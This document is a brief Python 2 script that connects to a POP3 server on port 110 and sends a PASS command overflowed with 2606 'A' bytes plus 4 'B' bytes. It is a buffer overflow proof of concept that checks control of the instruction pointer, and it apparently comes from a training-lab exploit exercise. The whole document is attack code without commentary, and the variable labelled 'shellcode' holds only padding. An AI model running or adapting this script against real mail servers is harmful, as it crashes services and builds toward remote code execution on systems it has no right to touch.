#!/usr/bin/python
import sys, socket

shellcode = "A" * 2606 + "B" * 4

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.10.91',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + shellcode + '\r\n')
except:
	print "Error Connecting to server"
